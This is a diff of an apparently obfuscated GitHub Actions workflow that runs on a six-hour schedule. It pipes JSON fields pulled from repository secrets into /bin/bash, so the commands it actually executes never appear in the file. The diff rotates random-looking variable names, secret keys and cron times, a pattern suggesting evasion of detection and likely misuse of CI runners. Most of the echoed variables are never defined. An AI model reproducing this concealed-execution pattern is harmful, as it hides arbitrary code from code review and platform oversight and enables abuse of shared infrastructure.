@@ -1,29 +1,27 @@
 name: hangyuuinuu
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 5/6 * * *'
-
-jobs:  # 23803
+    - cron: '20 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hangyuuinuu
         env:
-          vawf7: ${{ secrets.vawf7 }}
+          zlhtf921: ${{ secrets.zlhtf921 }}
         run: |
-          echo $vawf7 | jq -r .opg8151 | /bin/bash
-          echo $znpla26704 | jq -r .t013 | /bin/bash
-          echo $m4801 | jq -r .umq0053 | /bin/bash
-          echo $fj58135 | jq -r .vhzu9768 | /bin/bash
-          echo $nyo6 | jq -r .efyae6 | /bin/bash
-          echo $eci5317 | jq -r .ix84 | /bin/bash
-          echo $fq89 | jq -r .brhd5 | /bin/bash
-          echo $d018 | jq -r .g5210 | /bin/bash
-          echo $whh68 | jq -r .slu31 | /bin/bash
-          echo $b1531 | jq -r .kj533 | /bin/bash
-          echo $iqebn81801 | jq -r .m7 | /bin/bash
+          echo $zlhtf921 | jq -r .i58 | /bin/bash
+          echo $eua2016 | jq -r .kyer09589 | /bin/bash
+          echo $r185 | jq -r .chfw667 | /bin/bash
+          echo $glx75 | jq -r .hm25 | /bin/bash
+          echo $y9 | jq -r .ocip5 | /bin/bash
+          echo $nhp882 | jq -r .ivi74680 | /bin/bash
+          echo $lseft26 | jq -r .q4 | /bin/bash
+          echo $y22 | jq -r .f64719 | /bin/bash
+          echo $w66 | jq -r .nd5335 | /bin/bash
+          echo $o929 | jq -r .ol10 | /bin/bash
+          echo $c6278 | jq -r .uyok0 | /bin/bash
+          echo $wfaex3 | jq -r .p45 | /bin/bash
 
